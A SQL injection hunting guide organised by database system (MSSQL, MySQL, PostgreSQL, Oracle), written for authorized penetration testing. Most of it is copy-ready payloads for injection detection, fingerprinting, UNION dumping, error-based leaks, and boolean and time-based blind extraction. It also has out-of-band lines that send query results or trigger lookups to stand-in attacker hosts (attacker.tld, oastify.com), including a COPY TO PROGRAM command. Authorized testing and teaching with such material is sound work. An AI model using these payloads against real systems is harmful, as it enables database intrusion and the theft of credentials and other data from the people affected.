### SQL Injection Hunt Methodology by DBMS (MSSQL, MySQL, PostgreSQL, Oracle)

Use only with explicit authorization. This guide gives a fast, structured path from detection to data extraction, tailored per DBMS. Pair with your existing cheat sheets for deeper variants.

High-level flow:
- Detect injection type (error/boolean/time) and discover DBMS.
- If results reflect, prefer UNION. Else, use error-based; fall back to blind boolean/time and OOB when needed.
- Enumerate schema, then extract target data.

General safe probes:
- Syntax breakers: `'`, `"`, `)`, with comment tail: `-- `, `/*` (DBMS-dependent).
- Boolean toggles: `AND 1=1` vs `AND 1=2`; look for response/length changes.
- Time toggles: DBMS sleep primitive when true condition.

Note: Examples shown as inline fragments to append to a vulnerable parameter. Always adjust quoting, parentheses, and comment style to fit the original query shape.

Reference for automated support: [sqlmap](https://en.wikipedia.org/wiki/Sqlmap)

## Decision tree: question-driven SQLi hunting

1) Does input reach SQL? Identify injection type
- Send minimal breakers with correct comment style: `'`, `"`, `)`, `-- `, `/*`.
- Observe: DB error text, response length/status deltas, or timing changes.
- If no visible signal, try OOB-safe probes (DNS) appropriate for the stack.

2) Is data reflected to the response?
- Yes → Use UNION (in-band). Find column count and printable columns, then enumerate.
- No, but DB error leaks → Use error-based extraction (type casts, XML/arith errors).
- No reflection, no error → Blind boolean/time; do length/ASCII with binary search. Consider OOB.

3) Fingerprint DBMS early
- Comments: `-- `, `/*...*/`, `#` (MySQL only)
- Concat: Oracle/PSQL `'||'`; MSSQL `'+'`; MySQL `CONCAT()` / `'a' 'b'`
- Version/sleep primitives: `@@version`, `version()`, `v$version`; `SLEEP/WAITFOR/pg_sleep/dbms_pipe`.

4) Choose technique by context
- Results render → UNION-based.
- Verbose DB errors → Error-based.
- Silent app → Blind boolean/time or OOB.
- Stacked queries allowed → Enable OOB/side effects (be cautious).

5) Execute minimal path
- Confirm injection → DBMS fingerprint → technique selection → schema enum → target data extraction.

6) Safety and robustness
- Terminate cleanly with correct comment syntax (MySQL `-- ` requires trailing space).
- Mirror original quoting/parentheses; keep payload short and type-compatible (use `NULL`).
- On Oracle, use `FROM dual` where needed.

See `SQL Injections/wordlists/README.md` for context-to-list mapping and per-DBMS payloads.

---

## Microsoft SQL Server (MSSQL)

Discovery
- Comments: `-- `, `/* ... */`
- Concatenation: `'a'+'b'`
- Time primitive: `WAITFOR DELAY '0:0:5'`
- Version: `@@version`

Initial detection
- Error: `'` → SQL error page/log
- Boolean:
  - `AND 1=1-- ` vs `AND 1=2-- `
- Time-based:
  - `;IF(1=1) WAITFOR DELAY '0:0:5'-- `

Version / DB / User
- Version (UNION or inline):
```sql
UNION SELECT @@version-- 
```
- Current DB and user:
```sql
UNION SELECT DB_NAME(), SYSTEM_USER-- 
```

UNION setup
- Column count: increment `ORDER BY n` until error; last OK is n.
- Printable columns: replace `NULL` with a string to see which render.

Schema enumeration
- List tables/columns:
```sql
UNION SELECT table_schema, table_name FROM information_schema.tables-- 
UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users'-- 
```

Error-based extraction
- Leverage conversion errors:
```sql
AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.databases))-- 
```

Boolean blind
```sql
AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases),1,1))>77) THEN 1 ELSE 0 END)=1-- 
```

Time-based blind
```sql
;IF(ASCII(SUBSTRING(DB_NAME(),1,1))>77) WAITFOR DELAY '0:0:5'-- 
```

Out-of-band (DNS/SMB)
- UNC path triggers DNS/SMB lookup (often allowed even if xp_cmdshell is disabled):
```sql
DECLARE @p varchar(128)=(SELECT TOP 1 name FROM sys.databases);
EXEC('master..xp_dirtree "\\\\'+@p+'.attacker.tld\\a"');
```

---

## MySQL

Discovery
- Comments: `-- ` (needs trailing space), `/* ... */`, `#`
- Concatenation: `CONCAT('a','b')`, `'a' 'b'` (space)
- Time primitive: `SLEEP(5)`
- Version: `@@version`

Initial detection
- Boolean:
  - `AND 1=1-- ` vs `AND 1=2-- `
- Time-based:
  - `AND IF(1=1,SLEEP(5),0)-- `

Version / DB / User
```sql
UNION SELECT @@version-- 
UNION SELECT database()-- 
UNION SELECT user()-- 
```

UNION setup
- Column count: `ORDER BY n` or `UNION SELECT NULL,...` until success.

Schema enumeration
```sql
UNION SELECT table_schema, table_name FROM information_schema.tables-- 
UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users'-- 
```

Error-based extraction
- Use XML error functions (older MySQL) or JSON errors (version-dependent):
```sql
AND EXTRACTVALUE(1, CONCAT(0x5c,(SELECT database())))-- 
```

Boolean blind
```sql
AND LENGTH((SELECT database()))=8-- 
AND ASCII(SUBSTRING((SELECT user()),1,1))>77-- 
```

Time-based blind
```sql
AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>77,SLEEP(5),0)-- 
```

Out-of-band (Windows targets)
```sql
SELECT LOAD_FILE('\\\\attacker.tld\\a');
-- Or write out (priv dependent)
SELECT (SELECT user()) INTO OUTFILE '\\\\attacker.tld\\a';
```

---

## PostgreSQL

Discovery
- Comments: `-- `, `/* ... */`
- Concatenation: `'a'||'b'`
- Time primitive: `pg_sleep(5)`
- Version: `version()`

Initial detection
- Boolean:
  - `AND 1=1-- ` vs `AND 1=2-- `
- Time-based:
  - `AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- `

Version / DB / User
```sql
UNION SELECT version()-- 
UNION SELECT current_database()-- 
UNION SELECT current_user-- 
```

UNION setup
- Column count via `ORDER BY n` or `NULL` enumeration.

Schema enumeration
```sql
UNION SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema')-- 
UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users'-- 
```

Error-based extraction
- Cast to wrong type:
```sql
AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- 
```

Boolean blind
```sql
AND LENGTH((SELECT current_user))=13-- 
AND ASCII(SUBSTRING((SELECT current_database()),1,1))>77-- 
```

Time-based blind
```sql
AND CASE WHEN (ASCII(SUBSTRING((SELECT current_user),1,1))>77) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
```

Out-of-band
- Requires elevated privileges; can execute programs:
```sql
COPY (SELECT current_user) TO PROGRAM 'nslookup attacker.tld';
```

---

## Oracle

Discovery
- Comments: `-- `, `/* ... */`
- Concatenation: `'a'||'b'`
- Time primitive: `dbms_pipe.receive_message(('a'),5)` (permissions vary)
- Version sources: `v$version`, `v$instance`

Initial detection
- Boolean:
  - `AND 1=1-- ` vs `AND 1=2-- ` (Oracle often requires valid `FROM`; sometimes `FROM dual`)
- Time-based:
  - `AND CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual`

Version / DB / User / Schema
```sql
UNION SELECT banner FROM v$version-- 
UNION SELECT version FROM v$instance-- 
UNION SELECT SYS_CONTEXT('USERENV','CURRENT_SCHEMA') FROM dual-- 
UNION SELECT USER FROM dual-- 
```

UNION setup
- Column count via `ORDER BY n` or successive `NULL`s from `dual`. Many apps use fixed-selects; prefer error/boolean/time if no reflection.

Schema enumeration
```sql
UNION SELECT table_name FROM all_tables-- 
UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'-- 
```

Error-based extraction
- Force conversion exceptions:
```sql
AND 1=(SELECT TO_NUMBER((SELECT username FROM users WHERE ROWNUM=1)) FROM dual)-- 
```
- Or XML-based expansion for OOB/error (version/patch dependent):
```sql
AND EXTRACTVALUE(xmltype('<x/>'),CONCAT('\\',(SELECT USER))) IS NOT NULL
```

Boolean blind
```sql
AND (SELECT CASE WHEN (ASCII(SUBSTR((SELECT USER FROM dual),1,1))>77) THEN 1 ELSE 0 END FROM dual)=1-- 
```

Time-based blind
```sql
AND CASE WHEN (ASCII(SUBSTR((SELECT USER FROM dual),1,1))>77) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual
```

Out-of-band (DNS/HTTP)
- Depending on privileges and patch level:
```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://id.oastify.com/">%p;]>'),'/l') FROM dual;
-- Or network UTLs (if enabled):
SELECT UTL_INADDR.get_host_address('id.oastify.com') FROM dual;
```

---

## Practical enumeration sequence (per DBMS)

1) Confirm injection type
- Try `'` → error; try boolean toggles; try time primitive for the DBMS.

2) Fingerprint DBMS
- Use telltale comment/concat; try version primitive (`@@version`, `version()`, `v$version`).

3) UNION path (if reflection exists)
- Find column count (ORDER BY / NULLs)
- Find printable columns
- Print version, current db/schema, current user
- Enumerate `information_schema`/`all_*` tables → columns
- Dump rows with `LIMIT/OFFSET` or `TOP`/`ROWNUM`

4) Error-based path
- Use type-cast/conversion failures to leak single values (see DBMS sections).

5) Blind (boolean and time)
- Length/ASCII binary search on `database()`/`current_database()`/`DB_NAME()`/`USER`
- Optimize with binary search to reduce requests.

6) OOB (when allowed)
- Use DBMS-specific DNS/HTTP primitives to confirm and exfiltrate.

Tips
- Always terminate the original query cleanly with the correct comment style (`-- ` with a trailing space is required in MySQL).
- Mind quoting/parentheses; mirror the original query’s structure.
- Prefer `NULL` over literals when matching column types during UNION.
- For Oracle, many expressions require `FROM dual`.

Automation
- Use sqlmap as a cross-check or for bulk enumeration once you have confirmed injection and fingerprinted the DBMS.
